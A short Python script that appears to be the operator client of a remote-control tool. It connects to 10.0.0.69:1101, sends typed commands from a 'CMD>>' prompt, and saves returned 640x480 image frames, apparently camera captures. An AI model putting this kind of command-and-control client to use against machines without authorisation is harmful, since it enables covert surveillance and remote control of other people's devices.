import socket, numpy, cv2
from PIL import Image

s = socket.socket()
s.connect(("10.0.0.69", 1101))
#s.setblocking(False)

EOF = b"EOF----"
TXT = b"TXT----"
IMG = b"IMG----"

try:
    while True:
        try:
            out = s.recv(2048)
        except KeyboardInterrupt: break
        if len(out) == 2048:
            while out.find(EOF) == -1:
                out += s.recv(2048)
            print("[+] Message received")
        if out.find(TXT) != -1: #if text
            print(out[len(TXT):-len(EOF)].decode())
        elif out.find(IMG) != -1: #if image
            # imgStream = io.BytesIO()
            # imgStream.write(out[3:-3]) #remove metadata
            # img = Image.open(imgStream)
            # img.show()
            print(len(out[len(IMG):-len(EOF)]))
            ar = numpy.fromstring(out[len(IMG):-len(EOF)], numpy.uint8).reshape(480, 640, 3)
            filename = input("Filename:")
            cv2.imwrite(filename, ar)
            print("[+] Image saved")

        cmd = input("CMD>>")
        if cmd == "" or cmd == "quit": break
        s.send(cmd.encode())
finally:
    s.send(b"STOP")
    s.close()
